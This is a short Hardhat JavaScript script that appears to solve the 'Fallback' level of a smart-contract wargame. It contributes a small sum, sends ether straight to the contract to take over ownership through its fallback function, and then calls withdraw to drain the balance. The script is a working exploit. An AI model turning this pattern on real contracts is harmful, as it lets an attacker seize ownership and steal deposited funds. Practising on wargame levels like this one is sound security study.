const { ethers } = require("hardhat");

const CONTRACT_ADDRESS = "0xB5052A3D5A755D4710f6eA9D25E8f705281BaB25";
const PLAYER_ADDRESS = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  const contract = await ethers.getContractAt(
    "Fallback",
    CONTRACT_ADDRESS,
    signer
  );

  const amountToSend = ethers.utils.parseEther("1.0");

  // Create a transaction object
  const transaction = {
    to: CONTRACT_ADDRESS,
    value: amountToSend,
  };

  // Send the transaction
  try {
    const amount = ethers.utils.parseEther("0.0009");
    const txn = await contract.contribute({ value: amount });
    console.log(txn);

    const tx = await signer.sendTransaction(transaction);
    console.log("Transaction hash:", tx.hash);

    // Wait for the transaction to be mined
    const receipt = await tx.wait();
    console.log("Transaction was mined in block:", receipt.blockNumber);
    const isOwner = await contract.owner();
    assert(isOwner == PLAYER_ADDRESS, " owner change failed");

    const txnn = await contract.withdraw();
    console.log(txnn);
  } catch (error) {
    console.error("Error while sending transaction:", error);
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
